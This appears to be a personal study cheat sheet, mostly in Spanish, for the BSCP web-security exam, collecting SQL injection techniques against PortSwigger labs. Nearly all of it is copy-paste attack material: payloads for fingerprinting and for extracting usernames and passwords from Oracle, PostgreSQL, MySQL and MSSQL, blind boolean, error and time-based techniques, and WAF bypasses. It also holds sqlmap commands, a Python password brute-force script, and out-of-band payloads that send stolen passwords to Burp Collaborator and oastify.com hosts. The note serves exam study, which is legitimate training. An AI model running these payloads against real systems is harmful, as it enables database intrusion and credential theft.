PortSwigger cheat sheet:
https://portswigger.net/web-security/sql-injection/cheat-sheet

--------
# ⚠️⚠️⚠️ Si no lo pilla el SQLMap, probar casi seguro un Blind OOB

###### Comando Final:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
```
###### Enumerar tablas:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM (SELECT table_name FROM all_tables WHERE ROWNUM <= 10))||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
```
###### Enumerar Columnas:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='USERS_ABCDEF')||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
```
###### Loot Data:
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT LISTAGG(USERNAME_XYZ||':'||PASSWORD_XYZ,',') WITHIN GROUP (ORDER BY USERNAME_XYZ) FROM USERS_ABCDEF)||'.ID_COLLABORATOR.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -
```

---
# SQL Injection — (BSCP)

## 1. Contar columnas

```sql
' order by 10-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
```

Sube hasta que deje de dar error → nº de columnas confirmado.

---

## 2. Identificar el motor (fingerprinting) — payloads listos para copiar/pegar

Lanza uno a uno contra el punto de inyección. En cuanto uno dé respuesta "true"/normal (o el error esperado) → motor identificado.

**Concatenación**

|Motor|Payload|
|---|---|
|MSSQL|`' AND 'a'+'a'='aa'-- -`|
|Oracle / PostgreSQL|`' AND 'a'|
|MySQL / MariaDB|`' AND 'a' 'a'='aa'-- -`|

**Comentarios**

|Payload|Resultado esperado|
|---|---|
|`' OR '1'='1'#`|Solo trunca en MySQL/MariaDB|
|`' OR '1'='1'--x`|Falla en MySQL/MariaDB (falta espacio tras `--`); trunca bien en el resto|

**Tabla `dual` (Oracle)**

|Payload|Resultado esperado|
|---|---|
|`' UNION SELECT NULL-- -`|Falla en Oracle (falta FROM)|
|`' UNION SELECT NULL FROM dual-- -`|Si esto funciona tras fallar el anterior → Oracle|

**Versión** (ajusta nº de columnas según el paso 1)

|Motor|Payload|
|---|---|
|Oracle|`' UNION SELECT NULL,banner FROM v$version-- -`|
|MSSQL|`' UNION SELECT NULL,@@version-- -`|
|PostgreSQL|`' UNION SELECT NULL,version()-- -`|
|MySQL / MariaDB|`' UNION SELECT NULL,@@version-- -`|

**Confirmación extra por error de tipos** (si lo anterior no es concluyente)

|Motor|Payload|
|---|---|
|Oracle|`' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 1 END FROM dual)-- -`|
|MSSQL|`' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)-- -`|
|PostgreSQL|`' AND 1=(SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)-- -`|
|MySQL / MariaDB|`' AND 1=IF(1=1,(SELECT table_name FROM information_schema.tables),1)-- -`|

**Batched queries**

| Payload          | Resultado esperado                                                                          |
| ---------------- | ------------------------------------------------------------------------------------------- |
| `';SELECT 1-- -` | Sin error → MSSQL o PostgreSQL. Error → Oracle (no soporta) o MySQL (normalmente bloqueado) |

---

## 3. Payloads genéricos de blind boolean (mientras confirmas el motor)

-- **_Comprobar condición general_**

```sql
TrackingId=xyz' AND (SELECT 'a' FROM <table> LIMIT 1)='a
TrackingId=G6gw8KYi6CTDMGv3' and (select 'a' from <table> where <column>='<value>')='a'-- -
```

-- **_Longitud de contraseña (boolean)_**

```sql
TrackingId=xyz' AND (SELECT 'a' FROM <table> WHERE <user_column>='<username>' AND LENGTH(<password_column>)>1)='a
' and (select 'a' from <table> where <user_column>='<username>' and length(<password_column>)=20)='a'-- -
```

-- **_Brute force carácter a carácter (boolean)_**

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(<password_column>,1,1) FROM <table> WHERE <user_column>='<username>')='a
' and (select substring(<password_column>,1,1) from <table> where <user_column>='<username>')='o'-- -
```

-- **_Error-based visible (casting)_** — `CAST(x AS INT)` vale para Oracle/PostgreSQL/MSSQL; en MySQL usa EXTRACTVALUE (sección MySQL).

```sql
' or 1=cast((select <password_column> from <table> limit 1) as INT) -- -
TrackingId=' AND 1=CAST((SELECT <user_column> FROM <table> LIMIT 1) AS int)-- -
TrackingId=' AND 1=CAST((SELECT <password_column> FROM <table> LIMIT 1) AS int)-- -
```

---

## 4. ORACLE

-- **_Versión_**

```sql
' union select 'a',banner from v$version-- -
```

-- **_Usuario actual_**

```sql
' union select NULL, user from dual-- -
```

-- **_Listar tablas_**

```sql
' union select NULL, table_name from all_tables -- -
```

-- **_Listar columnas_**

```sql
' union select NULL, column_name from all_tab_columns where table_name='<table>' -- -
```

-- **_Extraer datos_**

```sql
' UNION SELECT <column1>,<column2> FROM <table>-- -
```

-- **_Error condicional (1/0)_**

```sql
'||(select case when(2=1) then to_char(1/0) else '' end from <table> where <user_column>='<username>')||'-- -
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
```

-- **_Error condicional (longitud)_**

```sql
'||(SELECT CASE WHEN LENGTH(<password_column>)>1 THEN to_char(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
```

-- **_Error condicional (brute force)_**

```sql
'||(SELECT CASE WHEN SUBSTR(<password_column>,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
```

-- **_Time delays_**

```sql
' dbms_pipe.receive_message(('a'),20)-- -
' SELECT dbms_pipe.receive_message(('a'),20)-- -
' UNION SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'-- -
```

-- **_OOB (Collaborator) — DNS lookup_**

```sql
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')-- -
```

-- **_OOB (Collaborator) — con exfiltración de datos_**

```sql
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select <password_column> from <table> where <user_column>='<username>')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

⚠️ EXTRACTVALUE/XXE: solo en instalaciones sin parchear. `UTL_INADDR`: requiere privilegios elevados.

-- **_Batched queries_** — no soportado en Oracle.

---

## 5. POSTGRESQL

-- **_Versión_**

```sql
' union select NULL, version()-- -
```

-- **_Base de datos actual / usuario actual_**

```sql
' union select NULL, current_database()-- -
' union select NULL, current_user-- -
```

-- **_Listar bases de datos_**

```sql
' union select NULL, datname from pg_database-- -
```

-- **_Listar esquemas_**

```sql
' union select NULL, schema_name from information_schema.schemata -- -
```

-- **_Listar tablas_**

```sql
' union select NULL, table_name from information_schema.tables where table_schema='<schema>' -- -
```

-- **_Listar columnas_**

```sql
' union select NULL, column_name from information_schema.columns where table_schema='<schema>' and table_name='<table>' -- -
```

-- **_Extraer datos_** — ⚠️ sin cross-database (`<db>.<table>` no existe aquí); usa `<schema>.<table>`.

```sql
' union select NULL, <user_column>||':'||<password_column> from <schema>.<table> -- -
' union select <column1>, <column2> from <schema>.<table> -- -
```

-- **_Error visible (extracción vía mensaje de error)_**

```sql
' AND 1=CAST((SELECT <password_column> FROM <table> LIMIT 1) AS int)-- -
```

-- **_Time delays_**

```sql
'||pg_sleep(5)-- -
';SELECT pg_sleep(5);--
'; SELECT CASE WHEN (<user_column>='<username>') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM <table>--
'; SELECT CASE WHEN (<user_column>='<username>' AND LENGTH(<password_column>)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM <table>-- -
'; SELECT CASE WHEN (<user_column>='<username>' AND SUBSTRING(<password_column>,1,1)='1') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM <table>-- -
```

-- **_Batched queries_** — soportado: `QUERY-1; QUERY-2`.

-- **_OOB (Collaborator) — DNS lookup_**

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

-- **_OOB (Collaborator) — con exfiltración de datos_**

```sql
create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();
```

---

## 6. MYSQL / MARIADB

-- **_Versión_**

```sql
' union select 1,@@version-- -
```

-- **_Base de datos actual / usuario actual_**

```sql
' union select 1, database()-- -
' union select 1, current_user()-- -
```

-- **_Listar bases de datos_**

```sql
' union select 1, schema_name from information_schema.schemata-- -
```

-- **_Listar tablas_**

```sql
' union select 1, table_name from information_schema.tables where table_schema='<db>'-- -
```

-- **_Listar columnas_**

```sql
' union select 1, column_name from information_schema.columns where table_name='<table>'-- -
```

-- **_Extraer datos_** — usa `concat()` primero (más fiable en la práctica); `group_concat()` solo si necesitas juntar varias filas en 1 sola y `concat()` no te sirve para eso.

```sql
' union select NULL, concat(<column1>,':', <column2>) from <db>.<table> -- -
' union select group_concat(<column1>,":",<column2>) from <db>.<table>-- -
```

-- **_Error condicional_**

```sql
' union select 1,IF(<user_column>='<username>',(SELECT table_name FROM information_schema.tables),'a')-- -
```

-- **_Error visible (extracción vía mensaje de error)_**

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT <password_column> FROM <table> LIMIT 1)))-- -
```

-- **_Time delays_**

```sql
' and sleep(5)-- -
1 or sleep(5)#
" or sleep(5)="
' SELECT IF(1=1,SLEEP(20),'a')-- -
```

-- **_Fuzzing / evasión_**

```sql
' or benchmark(10000000,MD5(1))#
```

-- **_OOB (solo Windows)_**

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

-- **_Batched queries_** — normalmente NO explotable (depende de la API que use la app).

---

## 7. MSSQL

-- **_Versión_**

```sql
' union select 1,@@version-- -
```

-- **_Base de datos actual / usuario actual_**

```sql
' union select 1, DB_NAME()-- -
' union select 1, SYSTEM_USER-- -
```

-- **_Listar bases de datos_**

```sql
' union select 1, name from master..sysdatabases-- -
```

-- **_Listar tablas_**

```sql
' union select 1, table_name from information_schema.tables-- -
```

-- **_Listar columnas_**

```sql
' union select 1, column_name from information_schema.columns where table_name='<table>'-- -
```

-- **_Extraer datos_**

```sql
' union select <column1>, <column2> from <db>.dbo.<table>-- -
```

-- **_Error condicional_**

```sql
' union select 1, CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- -
```

-- **_Error visible (extracción vía mensaje de error)_**

```sql
' AND 1=CONVERT(int,(SELECT <password_column> FROM <table> LIMIT 1))-- -
```

-- **_Time delays_**

```sql
;waitfor delay '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:20'-- -
```

-- **_Batched queries_** — soportado: `QUERY-1; QUERY-2`.

-- **_OOB (Collaborator) — DNS lookup_**

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

-- **_OOB (Collaborator) — con exfiltración de datos_**

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

---

## 8. HACKVERTOR — bypass WAF vía entidades XML (extensión Burp)

```xml
<@hex_entities>UNION SELECT NULL<@/hex_entities>
<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='<db>'<@/hex_entities>
<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='<table>'<@/hex_entities>
<@hex_entities>UNION SELECT <password_column> FROM <db>.<table> WHERE <user_column>='<username>'<@/hex_entities>
```

---

## 9. SQLMAP

```bash
sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'
sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*" --cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs
```

```bash
-u url
--dbs
-D '<db>' --tables
-D '<db>' -T '<table>' --columns
```

```bash
sqlmap -u 'https://TARGET.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT <column1>, <column2> FROM <db>.<table>"
```

---

## 10. Script Python — blind boolean carácter a carácter

```python
import requests, string, sys

URL = "https://TARGET.web-security-academy.net/filter?category=Gifts"
COOKIE = "tu_cookie_de_sesion"
SUCCESS_STR = "Welcome back"

def exploit():
    pwd = ""
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

    for pos in range(1, 21):
        found = False
        for c in charset:
            payload = f"xyz' AND (SELECT SUBSTRING(<password_column>,{pos},1) FROM <table> WHERE <user_column>='<username>')='{c}'-- -"
            try:
                r = requests.get(URL, cookies={"TrackingId": payload, "session": COOKIE})
                if SUCCESS_STR in r.text:
                    pwd += c
                    print(f"\r[+] Found: {pwd}", end="")
                    sys.stdout.flush()
                    found = True
                    break
            except Exception as e:
                print(f"\n[!] Error: {e}")
                sys.exit(1)
        if not found:
            break

    print(f"\n[✓] Done: {pwd}")

if __name__ == "__main__":
    exploit()
```


---

Payloads:
```
--> Numero COLUMNAS en la tabla (cambiando el numero)
' order by 10-- -

--> Nombre de la DB
' union select NULL, schema_name from information_schema.schemata -- -

--> Muestra todas las TABLAS de una DB
' union select group_concat(table_name) from information_schema.tables where table_schema='nombre_DB'-- -

--> Muestras las COLUMNAS de una tabla
' union select group_concat(column_name) from information_schema.columns where table_name='nombre'-- -

--> 'group_concat' / 'concat' concatena varios campos en 1 linea (no es obligatorio)
' union select group_concat(schema_name) from information_schema.schemata-- -

--> Podemos concatenar con doble pipe ||:
' union select NULL, username||':'||password from public.users -- -

--> Si NO saliera toda la informacion podemos jugar con limit X -> [0,inf]
' union select schema_name from information_schema.schematalimit X,1-- -

--> Te muestra todos los pares de user:pass con ese formato
' union select group_concat(username,":", password) from <db>.<table>'-- -

--> Enumerar todas las TABLAS de la base de datos X
' union select NULL, table_name from information_schema.tables where table_schema='nombre_DB' -- -

--> Enumerar todas las COLUMNAS donde la DB es X y la tabla es 'users_gienie'
' union select NULL, column_name from information_schema.columns where table_schema='public' and table_name='users_gienie' -- -

--> Mostrar nombre de todas las tablas
' union select NULL, table_name from all_tables -- -

--> Mostrar las columnas de 1 tabla
' union select NULL, column_name from all_tab_columns where table_name='USERS_VZSRVT' -- -
```

![[Pasted image 20260618135344.png]]

```
--> Se imprime todo el contenido de las columnas username y password de la DB public y tabla users_gienie

' union select username_zfqijh, password_lcewph from public.users_gienie -- -

' union select NULL, concat(username_zfqijh,':', password_lcewph) from public.users_gienie -- -
```

![[Pasted image 20260618135354.png]]

Visible Error-Based SQLi:
```
cast() as TYPE -> Casteamos un valor de objeto a TYPE
select(X) -> Devuelve el valor de X


' or 1=cast((select password from users limit 1) as INT) -- -
```

![[Pasted image 20260619172919.png]]
```
PostgreSQL -->  '||pg_sleep(5)-- -
MySQL -->   ' and sleep(5)-- -
```

Time Delay con Infiltracion de datos:
```
--> con ';' separamos una query de otra, pero para evitar conflicto lo URLcodeamos a hexadecimal (%3b):

'%3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end-- -
'%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- -
'%3b select case when(username='administrator' and substring(password,1,1)='1') then pg_sleep(5) else pg_sleep(0) end from users-- -
```

Exfiltracion con OBB en SQLi:
```
--> Para Oracle:
' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual-- -

' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select password from users where username='administrator')||'urpgbiyoc63ph5k4jigprnkvwm2dqce1.oastify.com/"> %25remote%3b]>'),'/l') FROM dual-- -

```

Bypass con XML en SQLi:
![[Pasted image 20260620204754.png|311]]

![[Pasted image 20260620204839.png]]

![[Pasted image 20260620205033.png]]

![[Pasted image 20260620205150.png]]


--------------------------------------------------------------------------

Oracle :
```
--> Forma de averiguar si estamos ante una DB Oracle:
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> valid
 
UNION SELECT NULL,NULL FROM dual-- -(DUAL es una tabla conocida de Oracle)

--> Ver la version de la DB Oracle:
' union select 'a',banner from v$version-- -

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_UQBWZK'--

'+UNION+SELECT+USERNAME_CPKXNX,+PASSWORD_MHEIKW+FROM+USERS_UQBWZK--

sqlmap -u 'https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT USERNAME_LASZLI, PASSWORD_GLJIEZ FROM PETER.USERS_NYXISJ"
```

MySQL & MSSQL:
```
--> Para mostrar la version no hace falta referenciar ninguna tabla como en Oracle
' union select 1,@@version
```

SQLMAP options

```js
magia =  sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs



sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'



-u url (to get database type)
--dbs (to get database name)
-D 'x' --tables (to get table names)
-D 'x' -T 'y' --columns (to get column names)
--sql-query "SELECT 'z' FROM 'y':'x' WHERE..."


Cookies:
sqlmap -u 'https://0a1f00dd030c941881478ad000eb009a.web-security-academy.net/' --cookie='TrackingId=WKeIOdvGpLvJVfLQ; session=cmJ9qZmmemaKrj2qg5qFXZOFVNF3D8eo' -p TrackingId --level 2 
```

Conditional Responses test:
```
Welcome message appears if rows are returned:

--> Si existe el 'administrator', la condicion devuelve una 'a':
TrackingId=G6gw8KYi6CTDMGv3' and (select 'a' from users where username='administrator')='a'-- -

' and (select substring(password,1,1) from users where username='administrator')='o'-- -

--> Longitud PASSWORD:
' and (select 'a' from users where username='administrator' and length(password)=20)='a'-- -

--> ORACLE with errors:
'||(select case when(2=1) then to_char(1/0) else '' end from users where username='administrator')||'-- -

TrackingId=Wh80UOwUs6kA9B53'AND+1=2--+- (Welcome Back message disappears)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Check passw length:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
Brute force password:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
...
You can also cluster bomb it
```

Conditional error test:
```
' -> error
'' -> no error
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> no error (Oracle)
'||(SELECT '' FROM not-a-real-table)||' -> error
Check if a database exists (users in this case):
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Test if you can controll errors, if the condition is true, show error:
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> no error

test if user administrator exists:
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -> error recieved, therefore there is a user administrator

password length:
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

password brute force cluster bomb first number and a-z:
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```


![[Pasted image 20260619123120.png|697]]

Visible errors tests:
```
Use CAST to check a query against a boolean:

' -> error with SQL query displayed
'-- -> no error
' AND CAST((SELECT 1) AS int)-- -> AND must be boolean
' AND 1=CAST((SELECT 1) AS int)-- -> no error
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -> username administrator displayed
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -> password for admin displayed
```

Postgre blind:
blinds:https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
```
'||pg_sleep(10)--
';SELECT pg_sleep(5);--
Time delays, use sqlmap or CASE:
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
cluster bomb
```

Out Of Band Blind **(Union select ...)** REQUIERED UNIOOOOOOOOOOOON!
```
 Oracle 	

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL 	

The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

```


DNS lookup with data exfiltration
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL 	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL 	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

XML encoding SQL Injection
Extension = Hackvertor
Try in diferent entities of the body
```
UNION SELECT NULL -> attack detected

xml encoding via hex entity of hackvertor extension
<@hex_entities>UNION SELECT NULL<@/hex_entities>
<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'<@/hex_entities>
<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'<@/hex_entities>
<@hex_entities>UNION SELECT password FROM public.users WHERE username='administrator'<@/hex_entities></storeId>
```


SACA EL WIJI XELI
```
'-- -
''
' SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')

' SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
' dbms_pipe.receive_message(('a'),20)--+-
' OR dbms_pipe.receive_message(('a'),20)--+-
' AND dbms_pipe.receive_message(('a'),20)--+-
' SELECT dbms_pipe.receive_message(('a'),20)--+-
'; SELECT dbms_pipe.receive_message(('a'),20)--+-
' UNION SELECT dbms_pipe.receive_message(('a'),20)--+-
LIMIT (SELECT dbms_pipe.receive_message(('a'),20))--+-
' WAITFOR DELAY '0:0:20'--+-
'; SELECT WAITFOR DELAY '0:0:20'--+-
' UNION WAITFOR DELAY '0:0:20'--+-
' AND WAITFOR DELAY '0:0:20'--+-
' OR WAITFOR DELAY '0:0:20'--+-
LIMIT SELECT(WAITFOR DELAY '0:0:20')--+-
'SELECT pg_sleep(20)--+-
'||pg_sleep(20)--+-
'; SELECT pg_sleep(10)--+-
'||pg_sleep(10)--+-
';UNION SELECT pg_sleep(10)--+-
LIMIT (SELECT+pg_sleep(20))--+-
'SELECT SLEEP(20)--+-
'||SLEEP(20)--+-
';SELECT SLEEP(20)--+-
'UNION+SELECT SLEEP(20)--+-
LIMIT (SELECT SLEEP(20))--+-
'UNION+SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'--+-
'SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
';SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
LIMIT (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual)--+-
'IF (1=1) WAITFOR DELAY '0:0:20'--+-
'SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'; SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'UNION SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
LIMIT (SELECT IF (1=1) WAITFOR DELAY '0:0:20')--+-
'SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
';SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
'UNION SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
LIMIT (SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END)--+-
'SELECT IF(1=1,SLEEP(20),'a')--+-
'UNION+SELECT IF(1=1,SLEEP(20),'a')--+-
';SELECT IF(1=1,SLEEP(20),'a')--+-
LIMIT (SELECT IF(1=1,SLEEP(20),'a'))--+-
```

Try collaborator:
```
